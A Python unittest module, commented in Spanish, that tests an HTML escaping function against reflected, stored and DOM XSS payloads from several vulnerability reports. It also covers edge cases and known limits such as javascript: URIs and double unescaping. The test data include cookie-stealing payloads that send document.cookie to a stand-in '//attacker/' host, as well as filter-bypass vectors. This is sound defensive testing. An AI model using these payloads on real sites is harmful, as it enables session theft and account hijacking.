"""
Módulo de sanitización y pruebas de seguridad contra Cross-Site Scripting (XSS).

Este archivo implementa:
1. Una función de sanitización de referencia en Python (`sanitize_html`) que neutraliza
   los caracteres peligrosos para contextos HTML y atributos (&, <, >, ", ').
2. Tests unitarios (utilizando `unittest`) que comprueban que los payloads documentados            en los informes de vulnerabilidad (vuln-0001, vuln-0006, vuln-0007, vuln-0010,
   vuln-0012, vuln-0015 y vuln-0017) son efectivamente neutralizados.                           3. Tests que verifican casos límite: payloads pre-escapados, cadenas vacías/nulas y Unicode.
4. Tests que demuestran que la función NO neutraliza atajos peligrosos o vectores fuera
   de contexto (por ejemplo, strings que fueron escapados por URL por error o URIs 'javascript:').

Todos los docstrings y explicaciones técnicas se encuentran en español.
"""

import html
import unittest
import urllib.parse


def sanitize_html(text: str) -> str:
    """
    Función de sanitización de referencia para mitigar vulnerabilidades XSS en HTML.

    Convierte los caracteres especiales y peligrosos en sus entidades HTML correspondientes:
      - '&'  ->  '&amp;'   (debe reemplazarse primero para evitar doble escape accidental)
      - '<'  ->  '&lt;'    (evita la apertura de elementos HTML o etiquetas <script>)
      - '>'  ->  '&gt;'    (evita el cierre de etiquetas HTML)
      - '"'  ->  '&quot;'  (evita la ruptura de atributos HTML delimitados por comillas dobles)
      - "'"  ->  '&#x27;'  (evita la ruptura de atributos HTML delimitados por comillas simples)

    Parámetros:
        text (str): Cadena de entrada no confiable que se desea renderizar en HTML.

    Retorna:
        str: Cadena sanitizada donde los metacaracteres HTML han sido neutralizados.
             Si se proporciona None, retorna una cadena vacía "".
    """
    if text is None:
        return ""
    if not isinstance(text, str):
        text = str(text)
    return html.escape(text, quote=True)


class TestXSSReportsPayloads(unittest.TestCase):
    """
    Verifica que la función de sanitización neutralice los payloads exactos y variantes
    documentados en los informes de vulnerabilidad (vuln-0001 a vuln-0017).
    """

    def test_vuln_0001_reflected_xss_hostname(self):
        """
        Reporte vuln-0001: Reflected XSS en el parámetro 'HostName' de
        '/util/serverStatusCheckService.jsp'.

        El endpoint refleja el parámetro directamente en una respuesta con Content-Type: text/html.
        Payloads analizados:
          - '<script>alert(document.domain)</script>'
          - "<script>window.__xss_pwned=1337;document.title='XSS'</script>"

        La sanitización debe neutralizar las etiquetas <script> y comillas, impidiendo
        la ejecución del script en el contexto de origen.
        """
        payload1 = "<script>alert(document.domain)</script>"
        sanitizado1 = sanitize_html(payload1)
        self.assertNotIn("<script>", sanitizado1)
        self.assertNotIn("</script>", sanitizado1)
        self.assertEqual(sanitizado1, "&lt;script&gt;alert(document.domain)&lt;/script&gt;")

        payload2 = "<script>window.__xss_pwned=1337;document.title='XSS'</script>"
        sanitizado2 = sanitize_html(payload2)
        self.assertNotIn("<script>", sanitizado2)
        self.assertNotIn("</script>", sanitizado2)
        self.assertNotIn("'", sanitizado2)
        self.assertIn("&#x27;XSS&#x27;", sanitizado2)
        self.assertEqual(
            sanitizado2,
            "&lt;script&gt;window.__xss_pwned=1337;document.title=&#x27;XSS&#x27;&lt;/script&gt;",
        )

    def test_vuln_0006_reflected_xss_search_query(self):
        """
        Reporte vuln-0006: Reflected XSS en el parámetro 'query' de '/search.jsp'.

        El valor se refleja en el cuerpo HTML dentro de un elemento <p>.
        Payloads analizados:
          - '<script>document.title="PWNED_SRCH"</script>'
          - "'><&test" (sonda de codificación)
          - "<script>fetch('//attacker/'+document.cookie)</script>"

        La sanitización debe neutralizar todas las etiquetas, comillas y ampersands.
        """
        payload1 = '<script>document.title="PWNED_SRCH"</script>'
        sanitizado1 = sanitize_html(payload1)
        self.assertNotIn("<script>", sanitizado1)
        self.assertNotIn('"', sanitizado1)
        self.assertIn("&quot;PWNED_SRCH&quot;", sanitizado1)
        self.assertEqual(
            sanitizado1,
            "&lt;script&gt;document.title=&quot;PWNED_SRCH&quot;&lt;/script&gt;",
        )

        probe = "'><&test"
        sanitizado_probe = sanitize_html(probe)
        self.assertEqual(sanitizado_probe, "&#x27;&gt;&lt;&amp;test")
        self.assertNotIn("'", sanitizado_probe)
        self.assertNotIn(">", sanitizado_probe)
        self.assertNotIn("<", sanitizado_probe)
        self.assertNotIn("&test", sanitizado_probe)

        payload_cookie = "<script>fetch('//attacker/'+document.cookie)</script>"
        sanitizado_cookie = sanitize_html(payload_cookie)
        self.assertNotIn("<script>", sanitizado_cookie)
        self.assertNotIn("'", sanitizado_cookie)
        self.assertIn("&lt;script&gt;", sanitizado_cookie)

    def test_vuln_0007_reflected_xss_content_filter_bypass(self):
        """
        Reporte vuln-0007: Reflected XSS en el parámetro 'content' de '/index.jsp'.

        La aplicación utilizaba una lista negra de palabras clave ('script', 'onerror',
        'onclick', etc.) que fue evadida mediante manejadores no contemplados como
        'ontoggle' en <details> o 'onstart' en <marquee>.
        Payloads analizados:
          - 'z<details open ontoggle=document.title=7>'
          - 'z<marquee onstart=M>M</marquee>'
          - "z<details open ontoggle=fetch('//attacker/'+document.cookie)>"

        La sanitización por escape de caracteres estructurales (< y >) neutraliza
        completamente el vector sin depender de listas negras defectuosas.
        """
        payload_details = "z<details open ontoggle=document.title=7>"
        sanitizado_details = sanitize_html(payload_details)
        self.assertNotIn("<details", sanitizado_details)
        self.assertNotIn(">", sanitizado_details)
        self.assertEqual(
            sanitizado_details,
            "z&lt;details open ontoggle=document.title=7&gt;",
        )

        payload_marquee = "z<marquee onstart=M>M</marquee>"
        sanitizado_marquee = sanitize_html(payload_marquee)
        self.assertNotIn("<marquee", sanitizado_marquee)
        self.assertNotIn("</marquee>", sanitizado_marquee)
        self.assertEqual(
            sanitizado_marquee,
            "z&lt;marquee onstart=M&gt;M&lt;/marquee&gt;",
        )

        payload_exfil = "z<details open ontoggle=fetch('//attacker/'+document.cookie)>"
        sanitizado_exfil = sanitize_html(payload_exfil)
        self.assertNotIn("<details", sanitizado_exfil)
        self.assertNotIn("'", sanitizado_exfil)
        self.assertIn("&lt;details", sanitizado_exfil)
        self.assertIn("&#x27;//attacker/&#x27;", sanitizado_exfil)

    def test_vuln_0010_reflected_xss_attribute_breakout(self):
        """
        Reporte vuln-0010: Reflected XSS en el parámetro 'query' de '/bank/queryxpath.jsp'.

        El parámetro se reflejaba dentro del atributo 'value' de una etiqueta <input>:
        <input type="text" id="query" name="query" value="PAYLOAD"/>
        Payloads analizados:
          - '"><details open ontoggle=document.title=9>'
          - '"><script>alert(1)</script>'
          - "\"><script>new Image().src='//attacker/'+document.cookie</script>"

        La sanitización debe escapar tanto las comillas dobles (") como los corchetes (<, >),
        impidiendo que el atacante cierre el atributo value e inyecte nuevas etiquetas.
        """
        payload1 = '"><details open ontoggle=document.title=9>'
        sanitizado1 = sanitize_html(payload1)
        self.assertNotIn('"', sanitizado1)
        self.assertNotIn("<", sanitizado1)
        self.assertNotIn(">", sanitizado1)
        self.assertEqual(
            sanitizado1,
            "&quot;&gt;&lt;details open ontoggle=document.title=9&gt;",
        )

        payload2 = '"><script>alert(1)</script>'
        sanitizado2 = sanitize_html(payload2)
        self.assertNotIn('"', sanitizado2)
        self.assertNotIn("<script>", sanitizado2)
        self.assertEqual(sanitizado2, "&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;")

        payload3 = '"><script>new Image().src=\'//attacker/\'+document.cookie</script>'
        sanitizado3 = sanitize_html(payload3)
        self.assertNotIn('"', sanitizado3)
        self.assertNotIn("'", sanitizado3)
        self.assertNotIn("<script>", sanitizado3)
        self.assertIn("&quot;&gt;&lt;script&gt;", sanitizado3)
        self.assertIn("&#x27;//attacker/&#x27;", sanitizado3)

    def test_vuln_0012_reflected_xss_feedback_post(self):
        """
        Reporte vuln-0012: Reflected XSS en el campo 'name' de 'POST /sendFeedback'.

        El valor se refleja en la página de confirmación dentro del contenido del elemento <p>:
        <p>Thank you for your comments, PAYLOAD. ...</p>
        Payloads analizados:
          - '<img src=x onerror=document.title=5>'
          - '<img src=x onerror="new Image().src=\'//attacker/\'+document.cookie">'

        La sanitización de < y > impide la creación del elemento <img>, dejando el payload
        como texto inofensivo.
        """
        payload1 = "<img src=x onerror=document.title=5>"
        sanitizado1 = sanitize_html(payload1)
        self.assertNotIn("<img", sanitizado1)
        self.assertNotIn(">", sanitizado1)
        self.assertEqual(sanitizado1, "&lt;img src=x onerror=document.title=5&gt;")

        payload2 = '<img src=x onerror="new Image().src=\'//attacker/\'+document.cookie">'
        sanitizado2 = sanitize_html(payload2)
        self.assertNotIn("<img", sanitizado2)
        self.assertNotIn('"', sanitizado2)
        self.assertNotIn("'", sanitizado2)
        self.assertEqual(
            sanitizado2,
            "&lt;img src=x onerror=&quot;new Image().src=&#x27;//attacker/&#x27;+document.cookie&quot;&gt;",
        )

    def test_vuln_0015_stored_xss_admin_adduser(self):
        """
        Reporte vuln-0015: Stored XSS mediante 'username' creado en '/admin/addUser'
        y renderizado en '/admin/admin.jsp'.

        El valor persistido en base de datos se emite dos veces por cada usuario:
        dentro del atributo value y como texto dentro de la etiqueta <option>:
        <option value="PAYLOAD">PAYLOAD</option>
        Payloads analizados:
          - '<img src=x onerror=window.__storedXss=778899>'

        La sanitización debe neutralizar tanto el escape del atributo (comillas)
        como la interpretación del elemento en el cuerpo de texto (<, >).
        """
        payload = "<img src=x onerror=window.__storedXss=778899>"
        sanitizado = sanitize_html(payload)
        self.assertNotIn("<img", sanitizado)
        self.assertNotIn(">", sanitizado)
        self.assertEqual(
            sanitizado,
            "&lt;img src=x onerror=window.__storedXss=778899&gt;",
        )

        # Simulación de la plantilla HTML segura con el valor sanitizado
        template_simulada = f'<option value="{sanitizado}">{sanitizado}</option>'
        self.assertNotIn("<img src=x", template_simulada)
        self.assertIn('&lt;img src=x onerror=window.__storedXss=778899&gt;', template_simulada)

    def test_vuln_0017_dom_xss_context_awareness(self):
        """
        Reporte vuln-0017: DOM-Based XSS en '/disclaimer.htm' vía parámetro 'url'.

        El script de la página toma el valor de la URL y lo asigna a 'window.location.href'.
        Payload con caracteres HTML / comillas:
          - "javascript:document.body.setAttribute('data-y','OK9')"

        La sanitización HTML escapa las comillas simples convirtiéndolas en &#x27;, lo
        que previene rupturas de atributos si se intentara incrustar en HTML.
        (Nota: la limitación intrínseca de no neutralizar el esquema 'javascript:' en
        contextos URI/DOM se evalúa detalladamente en TestAtajosPeligrososYLimitaciones).
        """
        payload_con_comillas = "javascript:document.body.setAttribute('data-y','OK9')"
        sanitizado = sanitize_html(payload_con_comillas)
        self.assertNotIn("'", sanitizado)
        self.assertIn("&#x27;data-y&#x27;", sanitizado)
        self.assertIn("&#x27;OK9&#x27;", sanitizado)


class TestCasosLimite(unittest.TestCase):
    """
    Verifica el comportamiento de la función de sanitización ante casos límite:
    payloads ya escapados, cadenas vacías/nulas y caracteres Unicode.
    """

    def test_payloads_ya_escapados(self):
        """
        Caso límite: Cadenas que ya contienen entidades HTML (pre-escapadas).

        Si un texto contiene '&lt;script&gt;' o '&quot;', la sanitización DEBE escapar
        el carácter '&' convirtiéndolo en '&amp;'. Esto produce '&amp;lt;script&amp;gt;',
        evitando confusiones en navegadores y asegurando que las entidades previas
        no puedan simular marcas HTML cuando se interpreten.
        """
        pre_escapado1 = "&lt;script&gt;alert(1)&lt;/script&gt;"
        resultado1 = sanitize_html(pre_escapado1)
        self.assertEqual(resultado1, "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;")
        self.assertNotIn("<", resultado1)
        self.assertNotIn(">", resultado1)

        pre_escapado2 = '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;'
        resultado2 = sanitize_html(pre_escapado2)
        self.assertEqual(
            resultado2,
            "&amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;",
        )

        pre_escapado_amp = "&amp;amp;"
        resultado_amp = sanitize_html(pre_escapado_amp)
        self.assertEqual(resultado_amp, "&amp;amp;amp;")

    def test_cadenas_vacias_y_valores_nulos(self):
        """
        Caso límite: Cadenas vacías, espacios en blanco y valores None.

        La función debe responder de forma robusta sin generar excepciones:
          - "" debe devolver ""
          - None debe devolver ""
          - "   " debe conservar los espacios en blanco sin alteración
        """
        self.assertEqual(sanitize_html(""), "")
        self.assertEqual(sanitize_html(None), "")
        self.assertEqual(sanitize_html("   "), "   ")
        self.assertEqual(sanitize_html("\t\n\r"), "\t\n\r")

    def test_unicode_y_caracteres_multibyte(self):
        """
        Caso límite: Soporte de Unicode y caracteres multibyte.

        La sanitización debe preservar caracteres válidos en diversos idiomas (español,
        japonés, cirílico, árabe), emojis y caracteres de ancho completo (full-width),
        mientras sigue neutralizando cualquier carácter HTML peligroso presente.
        """
        # Español con acentos y signos de apertura
        texto_espanol = "¡Hola, señor! ¿Cómo está el niño? 'éxito' & <seguridad>"
        sanitizado_es = sanitize_html(texto_espanol)
        self.assertIn("¡Hola, señor! ¿Cómo está el niño?", sanitizado_es)
        self.assertIn("&#x27;éxito&#x27;", sanitizado_es)
        self.assertIn("&amp;", sanitizado_es)
        self.assertIn("&lt;seguridad&gt;", sanitizado_es)
        self.assertNotIn("<seguridad>", sanitizado_es)

        # Multibyte y caracteres asiáticos con inyección
        texto_multilingue = "<script>alert('こんにちは / Привет / مرحبا 🌍')</script>"
        sanitizado_ml = sanitize_html(texto_multilingue)
        self.assertIn("こんにちは / Привет / مرحبا 🌍", sanitizado_ml)
        self.assertNotIn("<script>", sanitizado_ml)
        self.assertIn("&lt;script&gt;", sanitizado_ml)

        # Emojis y símbolos especiales
        emojis = "🔒🛡️ <script> 🚀💻"
        sanitizado_emojis = sanitize_html(emojis)
        self.assertIn("🔒🛡️", sanitizado_emojis)
        self.assertIn("🚀💻", sanitizado_emojis)
        self.assertNotIn("<script>", sanitizado_emojis)

        # Corchetes angulares de ancho completo (fullwidth: ＜ U+FF1C, ＞ U+FF1E)
        # Nota: en HTML estándar no abren etiquetas ASCII, pero deben preservarse sin errores.
        fullwidth = "＜script＞alert(1)＜/script＞"
        sanitizado_fw = sanitize_html(fullwidth)
        self.assertEqual(sanitizado_fw, "＜script＞alert(1)＜/script＞")

        # Comillas tipográficas (curly quotes: “ ” ‘ ’)
        curly_quotes = "“XSS” y ‘Inyección’"
        sanitizado_curly = sanitize_html(curly_quotes)
        self.assertEqual(sanitizado_curly, "“XSS” y ‘Inyección’")


class TestAtajosPeligrososYLimitaciones(unittest.TestCase):
    """
    Demuestra que la función de sanitización HTML NO neutraliza atajos peligrosos,
    vectores fuera de contexto o situaciones donde se pasa un string ya escapado por error.

    Estas pruebas demuestran las limitaciones fundamentales del escape HTML genérico
    cuando no se utiliza de forma consciente del contexto (context-aware escaping).
    """

    def test_atajo_string_url_escapado_no_neutralizado(self):
        """
        Atajo peligroso: String escapado por URL (%3C, %3E) pasado por error a la sanitización HTML.

        Si la aplicación recibe un payload URL-encoded (por ejemplo desde una consulta HTTP
        cruda antes de decodificar) como '%3Cscript%3Ealert(1)%3C%2Fscript%3E' y lo pasa
        a 'sanitize_html', la función NO modifica la cadena porque no contiene literalmente
        '<', '>', comillas o ampersands.

        Si posteriormente el navegador o un componente de la aplicación (como `decodeURIComponent`
        o un decodificador del servidor) decodifica la cadena en un contexto de renderizado,
        el script malicioso emerge intacto y se ejecuta, demostrando que 'sanitize_html'
        NO neutralizó este atajo.
        """
        payload_url_encoded = "%3Cscript%3Ealert(1)%3C%2Fscript%3E"

        # La sanitización HTML NO altera el string URL-escapado
        sanitizado = sanitize_html(payload_url_encoded)
        self.assertEqual(
            sanitizado,
            payload_url_encoded,
            "La sanitización HTML no modificó el payload URL-escapado",
        )
        self.assertNotIn("&lt;", sanitizado)

        # Cuando el consumidor final decodifica la URL, el código XSS peligroso resurge íntegro
        resultado_decodificado = urllib.parse.unquote(sanitizado)
        self.assertIn("<script>", resultado_decodificado)
        self.assertIn("</script>", resultado_decodificado)
        self.assertIn("alert(1)", resultado_decodificado)

    def test_atajo_javascript_uri_dom_xss_no_neutralizado(self):
        """
        Atajo peligroso: Payloads de esquema 'javascript:' en contextos URI o DOM (vuln-0017).

        En vuln-0017.md, la vulnerabilidad en '/disclaimer.htm' ocurre al asignar la entrada
        del usuario directamente a 'window.location.href':
          url=javascript:document.title=1

        El payload 'javascript:document.title=1' NO contiene caracteres '<', '>', comillas
        ni ampersands. Por lo tanto, 'sanitize_html' devuelve la cadena exactamente igual.

        Si esta cadena sanitizada se inserta en un contexto de URL (como un atributo
        <a href="..."> o asignada a 'location.href'), el código JavaScript se ejecutará.
        Esto demuestra que el escape HTML por sí solo NO protege contra vectores URI/DOM.
        """
        payload_js = "javascript:document.title=1"

        sanitizado = sanitize_html(payload_js)

        # La sanitización HTML es completamente ineficaz para neutralizar el esquema javascript:
        self.assertEqual(
            sanitizado,
            payload_js,
            "El esquema javascript: no contiene caracteres HTML, por lo que pasa sin cambios",
        )
        self.assertTrue(
            sanitizado.startswith("javascript:"),
            "El prefijo ejecutable 'javascript:' permanece activo",
        )

    def test_atajo_string_preescapado_con_doble_desescapado(self):
        """
        Atajo peligroso: String ya escapado con entidades HTML que sufre doble des-escapado.

        Si un desarrollador pasa por error un string ya escapado a una capa que espera
        texto plano, y posteriormente el framework o un componente en el cliente realiza
        una des-escapado (por ejemplo mediante `html.unescape()` o asignación a `.innerHTML`
        esperando texto puro), el escape de ampersands puede crear una falsa sensación
        de seguridad.

        Demuestra cómo el ciclo de des-escapado restaura el payload ejecutable si no se
        respeta la regla de escapar una sola vez exactamente en el punto de salida.
        """
        payload_original = "<script>alert('bypass')</script>"
        string_ya_escapado = html.escape(payload_original, quote=True)

        # Se pasa a sanitize_html un string que ya estaba escapado
        doble_sanitizado = sanitize_html(string_ya_escapado)

        # La función convirtió los '&' en '&amp;'
        self.assertIn("&amp;lt;script&amp;gt;", doble_sanitizado)

        # Un consumidor que realiza un primer des-escapado recupera la entidad:
        paso1 = html.unescape(doble_sanitizado)
        self.assertEqual(paso1, string_ya_escapado)

        # Un segundo procesamiento o parseo DOM (como innerHTML tras procesar entidad)
        # des-escapa al script original ejecutable:
        paso2 = html.unescape(paso1)
        self.assertEqual(
            paso2,
            payload_original,
            "El doble des-escapado restituye el vector XSS original",
        )
        self.assertIn("<script>", paso2)


if __name__ == "__main__":
    unittest.main()
